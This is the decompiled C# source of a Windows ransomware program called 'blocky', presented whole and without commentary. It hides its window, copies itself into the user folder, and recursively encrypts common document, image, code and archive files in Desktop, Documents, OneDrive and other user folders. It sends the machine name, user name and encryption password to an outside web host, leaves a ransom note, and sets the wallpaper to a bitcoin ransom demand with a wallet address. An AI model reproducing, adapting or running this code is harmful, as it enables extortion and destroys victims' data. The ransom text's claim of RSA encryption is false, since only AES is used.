using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace blocky
{
	// Token: 0x02000002 RID: 2
	public partial class Form1 : Form
	{
		// Token: 0x06000001 RID: 1
		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

		// Token: 0x06000002 RID: 2 RVA: 0x00002050 File Offset: 0x00000250
		public Form1()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000003 RID: 3 RVA: 0x000020A4 File Offset: 0x000002A4
		private void Form1_Load(object sender, EventArgs e)
		{
			base.Opacity = 0.0;
			base.ShowInTaskbar = false;
			this.startAction();
		}

		// Token: 0x17000001 RID: 1
		// (get) Token: 0x06000004 RID: 4 RVA: 0x000020C8 File Offset: 0x000002C8
		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams createParams = base.CreateParams;
				createParams.ExStyle |= 128;
				return createParams;
			}
		}

		// Token: 0x06000005 RID: 5 RVA: 0x000020F5 File Offset: 0x000002F5
		private void Form_Shown(object sender, EventArgs e)
		{
			base.Visible = false;
			base.Opacity = 100.0;
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002110 File Offset: 0x00000310
		public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[]
			{
				1,
				2,
				3,
				4,
				5,
				6,
				7,
				8
			};
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
				{
					rijndaelManaged.KeySize = 256;
					rijndaelManaged.BlockSize = 128;
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
					rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
					rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
					rijndaelManaged.Mode = CipherMode.CBC;
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
					{
						cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
						cryptoStream.Close();
					}
					result = memoryStream.ToArray();
				}
			}
			return result;
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002224 File Offset: 0x00000424
		public string CreatePassword(int length)
		{
			StringBuilder stringBuilder = new StringBuilder();
			Random random = new Random();
			while (0 < length--)
			{
				stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()".Length)]);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x06000008 RID: 8 RVA: 0x0000227C File Offset: 0x0000047C
		public void SendPassword(string password)
		{
			try
			{
				string str = string.Concat(new string[]
				{
					"?computer_name=",
					this.computerName,
					"&userName=",
					this.userName,
					"&password=",
					password,
					"&allow=ransom"
				});
				string address = this.targetURL + str;
				string text = new WebClient().DownloadString(address);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002300 File Offset: 0x00000500
		public void EncryptFile(string file, string password)
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] array = Encoding.UTF8.GetBytes(password);
			array = SHA256.Create().ComputeHash(array);
			byte[] bytes = this.AES_Encrypt(bytesToBeEncrypted, array);
			string str = "Users\\";
			string str2 = str + this.userName + "\\Desktop\\READ_IT.txt.locked";
			string path = this.userDir + str2;
			bool flag = File.Exists(path);
			if (flag)
			{
				File.Delete(path);
			}
			File.WriteAllBytes(file, bytes);
			File.Move(file, file + ".locked");
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002390 File Offset: 0x00000590
		public void encryptDirectory(string location, string password)
		{
			try
			{
				string[] source = new string[]
				{
					".txt",
					".jar",
					".exe",
					".dat",
					".contact",
					".settings",
					".doc",
					".docx",
					".xls",
					".xlsx",
					".ppt",
					".pptx",
					".odt",
					".jpg",
					".png",
					".csv",
					".py",
					".sql",
					".mdb",
					".sln",
					".php",
					".asp",
					".aspx",
					".html",
					".htm",
					".xml",
					".psd",
					".pdf",
					".dll",
					".c",
					".cs",
					".mp3",
					".mp4",
					".f3d",
					".dwg",
					".cpp",
					".zip",
					".rar",
					".mov",
					".rtf",
					".bmp",
					".mkv",
					".avi",
					".apk",
					".lnk",
					".iso",
					".7-zip",
					".ace",
					".arj",
					".bz2",
					".cab",
					".gzip",
					".lzh",
					".tar",
					".uue",
					".xz",
					".z",
					".001",
					".mpeg",
					".mp3",
					".mpg",
					".core",
					".crproj",
					".pdb",
					".ico",
					".pas",
					".db",
					".torrent"
				};
				string[] files = Directory.GetFiles(location);
				string[] directories = Directory.GetDirectories(location);
				for (int i = 0; i < files.Length; i++)
				{
					string extension = Path.GetExtension(files[i]);
					bool flag = source.Contains(extension);
					if (flag)
					{
						this.EncryptFile(files[i], password);
					}
				}
				for (int j = 0; j < directories.Length; j++)
				{
					this.encryptDirectory(directories[j], password);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00002698 File Offset: 0x00000898
		public void MoveVirus()
		{
			string path = this.userDir + this.userName + "\\Rand123";
			string text = this.userDir + this.userName + "\\Rand123\\local.exe";
			bool flag = !Directory.Exists(path);
			if (flag)
			{
				Directory.CreateDirectory(path);
			}
			else
			{
				bool flag2 = File.Exists(text);
				if (flag2)
				{
					File.Delete(text);
				}
			}
			string str = "\\" + Process.GetCurrentProcess().ProcessName + ".exe";
			string text2 = Directory.GetCurrentDirectory() + str;
			string sourceFileName = text2;
			File.Move(sourceFileName, text);
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002738 File Offset: 0x00000938
		public static bool CheckForInternetConnection()
		{
			bool result;
			try
			{
				using (WebClient webClient = new WebClient())
				{
					using (webClient.OpenRead("https://www.google.com"))
					{
						result = true;
					}
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600000D RID: 13 RVA: 0x000027A4 File Offset: 0x000009A4
		public void startAction()
		{
			this.MoveVirus();
			string password = this.CreatePassword(15);
			this.Directory_Settings_Sending(password);
			this.messageCreator();
			string path = this.userDir + this.userName + "\\ransom.bmp";
			bool flag;
			do
			{
				flag = Form1.CheckForInternetConnection();
				bool flag2 = flag;
				if (flag2)
				{
					this.CreateWallpaper(path);
					this.SendPassword(password);
				}
			}
			while (!flag);
			Application.Exit();
		}

		// Token: 0x0600000E RID: 14 RVA: 0x0000281C File Offset: 0x00000A1C
		public void Directory_Settings_Sending(string password)
		{
			string str = "Users\\";
			string location = this.userDir + str + this.userName + "\\Desktop";
			string location2 = this.userDir + str + this.userName + "\\Links";
			string location3 = this.userDir + str + this.userName + "\\Contacts";
			string location4 = this.userDir + str + this.userName + "\\Desktop";
			string location5 = this.userDir + str + this.userName + "\\Documents";
			string location6 = this.userDir + str + this.userName + "\\Downloads";
			string location7 = this.userDir + str + this.userName + "\\Pictures";
			string location8 = this.userDir + str + this.userName + "\\Music";
			string location9 = this.userDir + str + this.userName + "\\OneDrive";
			string location10 = this.userDir + str + this.userName + "\\Saved Games";
			string location11 = this.userDir + str + this.userName + "\\Favorites";
			string location12 = this.userDir + str + this.userName + "\\Searches";
			string location13 = this.userDir + str + this.userName + "\\Videos";
			this.encryptDirectory(location, password);
			this.encryptDirectory(location2, password);
			this.encryptDirectory(location3, password);
			this.encryptDirectory(location4, password);
			this.encryptDirectory(location5, password);
			this.encryptDirectory(location6, password);
			this.encryptDirectory(location7, password);
			this.encryptDirectory(location8, password);
			this.encryptDirectory(location9, password);
			this.encryptDirectory(location10, password);
			this.encryptDirectory(location11, password);
			this.encryptDirectory(location12, password);
			this.encryptDirectory(location13, password);
		}

		// Token: 0x0600000F RID: 15 RVA: 0x000029F4 File Offset: 0x00000BF4
		public void messageCreator()
		{
			string str = "\\Desktop\\READ_IT.txt";
			string path = this.userDir + "Users\\" + this.userName + str;
			string text = this.computerName + "-" + this.userName;
			string[] contents = new string[]
			{
				"B L O C K Y",
				"Your personal files have been ecrypted. Visit your home page",
				"PAGE",
				"and recover your files"
			};
			File.WriteAllLines(path, contents);
		}

		// Token: 0x06000010 RID: 16 RVA: 0x00002A66 File Offset: 0x00000C66
		public void SetWallpaper(string path)
		{
			Form1.SystemParametersInfo(20U, 0U, path, 3U);
		}

		// Token: 0x06000011 RID: 17 RVA: 0x00002A74 File Offset: 0x00000C74
		private void CreateWallpaper(string path)
		{
			try
			{
				string text = this.Create(17);
				string s = string.Concat(new string[]
				{
					"All your files are encrypted with RSA-2048 and AES-128 cipher",
					Environment.NewLine,
					"More information about RSA and AES can be found here:",
					Environment.NewLine,
					"https://en.wikipedia.org/wiki/RSA_(cryptosystem)",
					Environment.NewLine,
					"https://en.wikipedia.org/wiki/Advanced_Encryption_Standard",
					Environment.NewLine,
					Environment.NewLine,
					"In order to decrypt your files you need to follow these steps",
					Environment.NewLine,
					"1) buy bitcoins https://cex.io/buy-bitcoins",
					Environment.NewLine,
					"2) send 0.055 BTC to",
					Environment.NewLine,
					"32CCbV3wMs4kRo8vZ9GuusgzZh4D5GdkUo",
					Environment.NewLine,
					"3) Perform a payment",
					Environment.NewLine,
					Environment.NewLine,
					"Your personal identification ID: ",
					text
				});
				Bitmap bitmap = new Bitmap(this.pictureBox1.Width, this.pictureBox1.Height);
				Font font = new Font("TimesNewRoman", 25f, FontStyle.Regular, GraphicsUnit.Pixel);
				Graphics graphics = Graphics.FromImage(bitmap);
				graphics.DrawString(s, font, Brushes.Tomato, new Point(0, 0));
				bitmap.Save(path);
				this.SetWallpaper(path);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00002BD8 File Offset: 0x00000DD8
		public string Create(int length)
		{
			StringBuilder stringBuilder = new StringBuilder();
			Random random = new Random();
			random.Next(17, 18);
			while (0 < length--)
			{
				stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()".Length)]);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x04000001 RID: 1
		private string targetURL = "http://rose-flowers.epizy.com/write.php";

		// Token: 0x04000002 RID: 2
		private string userName = Environment.UserName;

		// Token: 0x04000003 RID: 3
		private string computerName = Environment.MachineName.ToString();

		// Token: 0x04000004 RID: 4
		private string userDir = "C:\\";
	}
}
